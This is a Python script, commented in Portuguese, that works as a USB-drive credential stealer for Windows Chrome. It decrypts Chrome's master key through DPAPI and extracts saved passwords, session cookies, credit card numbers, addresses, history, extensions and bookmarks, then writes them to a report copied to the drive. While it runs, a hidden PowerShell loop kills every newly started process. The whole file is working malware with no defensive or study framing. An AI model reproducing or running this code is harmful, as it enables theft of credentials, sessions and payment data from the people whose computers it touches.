import os
import sys
import time
import json
import base64
import sqlite3
import shutil
import subprocess
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime

# ============================================
# CONFIGURAÇÕES
# ============================================
USUARIO = os.getlogin()
PASTA_ATUAL = os.path.dirname(os.path.abspath(__file__))
PASTA_SAIDA = os.path.join(PASTA_ATUAL, "Credenciais")
os.makedirs(PASTA_SAIDA, exist_ok=True)

ARQUIVO_LOG = os.path.join(PASTA_SAIDA, f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

def log(texto):
    # Força a gravação em UTF-8 para evitar erros de codificação
    with open(ARQUIVO_LOG, "a", encoding="utf-8") as f:
        f.write(texto + "\n")
    print(texto.encode('ascii', errors='replace').decode())  # Exibe sem quebrar no console

# ============================================
# 1. BLOQUEADOR DE APPS (OPCIONAL)
# ============================================
def ativar_bloqueio():
    log("[!] Ativando bloqueio...")
    script = """
    while ($true) {
        $novos = Get-Process | Where-Object { $_.StartTime -gt (Get-Date).AddSeconds(-2) -and $_.ProcessName -notin @('powershell','cmd','explorer','Coletor') }
        foreach ($p in $novos) {
            try { Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue } catch {}
        }
        Start-Sleep -Milliseconds 500
    }
    """
    path = os.path.join(PASTA_SAIDA, "block.ps1")
    with open(path, "w") as f:
        f.write(script)
    subprocess.Popen(
        f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "{path}"',
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    log("[OK] Bloqueio ativado!")
    return path

def desativar_bloqueio(path):
    log("[!] Desativando bloqueio...")
    try: os.remove(path)
    except: pass
    subprocess.run('taskkill /f /im powershell.exe', shell=True, capture_output=True)
    log("[OK] Bloqueio desativado!")

# ============================================
# 2. COLETA DE DADOS (SEM EMOJIS)
# ============================================
def pegar_chave():
    path = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Local State"
    with open(path, 'r') as f:
        local = json.load(f)
    chave = base64.b64decode(local["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(chave, None, None, None, 0)[1]

def coletar_senhas(chave):
    log("[+] Coletando senhas...")
    caminho = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/Login Data"
    if not os.path.exists(caminho):
        return ["Chrome nao encontrado"]
    temp = os.path.join(PASTA_SAIDA, "temp.db")
    shutil.copyfile(caminho, temp)
    creds = []
    conn = sqlite3.connect(temp)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    for url, user, enc in cursor.fetchall():
        try:
            nonce = enc[3:15]
            cipher = enc[15:-16]
            tag = enc[-16:]
            aes = AES.new(chave, AES.MODE_GCM, nonce=nonce)
            senha = aes.decrypt_and_verify(cipher, tag).decode()
            creds.append(f"URL: {url}\nUsuário: {user}\nSenha: {senha}\n")
        except:
            pass
    conn.close()
    os.remove(temp)
    log(f"    OK {len(creds)} senhas")
    return creds

def coletar_cookies(chave):
    log("[+] Coletando cookies...")
    caminho = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies"
    if not os.path.exists(caminho):
        return []
    temp = os.path.join(PASTA_SAIDA, "cookies_temp.db")
    shutil.copyfile(caminho, temp)
    cookies = []
    conn = sqlite3.connect(temp)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    for host, nome, enc in cursor.fetchall():
        try:
            nonce = enc[3:15]
            cipher = enc[15:-16]
            tag = enc[-16:]
            aes = AES.new(chave, AES.MODE_GCM, nonce=nonce)
            valor = aes.decrypt_and_verify(cipher, tag).decode()
            cookies.append(f"Host: {host}\nCookie: {nome}={valor}\n")
        except:
            pass
    conn.close()
    os.remove(temp)
    log(f"    OK {len(cookies)} cookies")
    return cookies

def coletar_historico():
    log("[+] Coletando historico...")
    caminho = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/History"
    if not os.path.exists(caminho):
        return []
    temp = os.path.join(PASTA_SAIDA, "history_temp.db")
    shutil.copyfile(caminho, temp)
    hist = []
    conn = sqlite3.connect(temp)
    cursor = conn.cursor()
    cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 100")
    for url, titulo in cursor.fetchall():
        hist.append(f"URL: {url}\nTítulo: {titulo}\n")
    conn.close()
    os.remove(temp)
    log(f"    OK {len(hist)} sites")
    return hist

def coletar_autofill():
    log("[+] Coletando autofill...")
    caminho = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/Web Data"
    if not os.path.exists(caminho):
        return []
    temp = os.path.join(PASTA_SAIDA, "web_temp.db")
    shutil.copyfile(caminho, temp)
    dados = []
    conn = sqlite3.connect(temp)
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
        for nome, mes, ano, enc in cursor.fetchall():
            try:
                num = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode()
                dados.append(f"CARTÃO: {nome} | {mes}/{ano} | {num}")
            except:
                pass
    except:
        pass
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT full_name, street_address, city, state, zipcode FROM autofill_profiles")
        for nome, rua, cidade, estado, cep in cursor.fetchall():
            dados.append(f"ENDEREÇO: {nome} | {rua}, {cidade}-{estado} | {cep}")
    except:
        pass
    conn.close()
    os.remove(temp)
    log(f"    OK {len(dados)} itens")
    return dados

def coletar_extensoes():
    log("[+] Coletando extensoes...")
    path = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/Extensions"
    if not os.path.exists(path):
        return ["Nenhuma extensao"]
    ext = []
    for e in os.listdir(path):
        try:
            manifest = os.path.join(path, e, "manifest.json")
            if os.path.exists(manifest):
                with open(manifest, 'r') as f:
                    data = json.load(f)
                    nome = data.get("name", e)
                    ext.append(f"  {nome} ({e})")
        except:
            ext.append(f"  {e}")
    log(f"    OK {len(ext)} extensoes")
    return ext

def coletar_favoritos():
    log("[+] Coletando favoritos...")
    path = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/Bookmarks"
    if not os.path.exists(path):
        return []
    with open(path, 'r', encoding='utf-8') as f:
        data = json.load(f)
    favs = []
    def extrair(node, pasta=""):
        if "children" in node:
            for child in node["children"]:
                if child.get("type") == "url":
                    favs.append(f"{pasta}/{child.get('name','')} -> {child.get('url','')}")
                elif child.get("type") == "folder":
                    extrair(child, pasta + "/" + child.get("name",""))
    extrair(data.get("roots", {}).get("bookmark_bar", {}))
    extrair(data.get("roots", {}).get("other", {}))
    log(f"    OK {len(favs)} favoritos")
    return favs

# ============================================
# 3. EXECUÇÃO PRINCIPAL
# ============================================
def main():
    log("="*60)
    log("COLETOR MAXIMO")
    log(f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
    log(f"Usuario: {USUARIO}")
    log("="*60)

    script_bloqueio = ativar_bloqueio()

    try:
        chave = pegar_chave()
        log("\n[+] Chave obtida!")

        log("\n[+] COLETANDO:")
        dados = {
            "senhas": coletar_senhas(chave),
            "cookies": coletar_cookies(chave),
            "historico": coletar_historico(),
            "autofill": coletar_autofill(),
            "extensoes": coletar_extensoes(),
            "favoritos": coletar_favoritos()
        }

        nome = f"credenciais_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        caminho = os.path.join(PASTA_SAIDA, nome)

        with open(caminho, "w", encoding="utf-8") as f:
            f.write("="*80 + "\n")
            f.write("RELATORIO COMPLETO\n")
            f.write(f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
            f.write(f"Usuario: {USUARIO}\n")
            f.write("="*80 + "\n\n")

            for secao, itens in dados.items():
                f.write(f"[{secao.upper()}]\n")
                f.write("-"*40 + "\n")
                if itens:
                    for item in itens:
                        f.write(item + "\n")
                else:
                    f.write("Nenhum dado encontrado\n")
                f.write("\n")

        shutil.copy(caminho, os.path.join(PASTA_ATUAL, nome))

        log(f"\n[OK] Relatorio salvo em: {caminho}")
        log(f"[OK] Copia na raiz do pendrive: {nome}")

    except Exception as e:
        log(f"[ERRO] {e}")
        import traceback
        log(traceback.format_exc())

    finally:
        desativar_bloqueio(script_bloqueio)

    log("\n" + "="*60)
    log("[OK] FINALIZADO!")
    time.sleep(5)

if __name__ == "__main__":
    main()
